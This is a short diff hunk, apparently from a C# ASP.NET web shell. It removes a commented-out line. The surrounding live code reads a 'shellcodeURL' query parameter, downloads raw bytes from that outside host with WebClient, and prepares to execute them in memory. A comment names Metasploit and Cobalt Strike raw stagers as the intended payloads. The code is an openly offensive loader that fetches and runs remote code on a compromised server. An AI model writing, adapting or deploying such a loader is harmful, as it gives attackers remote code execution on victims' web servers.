@@ -528,7 +528,6 @@ public static extern IntPtr GetStdHandle(IntPtr handle);
                             }
                          //download&load
                          if(!(String.IsNullOrEmpty((Request.QueryString["shellcodeURL"])))){
-                            //(new WebClient()).DownloadFile(Request.QueryString["memory"], "c:\\users\\public\\tmp.bin");
                             //need raw bin stager <= -f raw on metasploit, raw on cobalstrike
                             byte[] codeBytes = (new WebClient()).DownloadData(Request.QueryString["shellcodeURL"]);
                                 IntPtr handle = IntPtr.Zero;
